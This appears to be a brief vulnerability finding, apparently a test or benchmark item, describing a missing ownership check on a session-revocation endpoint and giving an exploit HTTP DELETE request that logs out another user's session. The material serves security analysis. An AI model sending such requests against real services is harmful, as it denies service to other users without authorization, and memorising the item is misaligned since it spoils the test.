diagnosis: The session revocation route allows any authenticated user to delete arbitrary active sessions from the MongoStore by passing req.params.sessionId. Because the endpoint does not verify whether the targeted session belongs to the requesting user, an attacker can enumerate or inject session IDs to arbitrarily log out other active users across the platform, resulting in denial-of-service.
exploit_request:
DELETE /api/sessions/sess_user_bob_441029/revoke HTTP/1.1
Host: accounts.saas.internal:4000
Cookie: connect.sid=s%3Aattacker_session_cookie
Accept: application/json
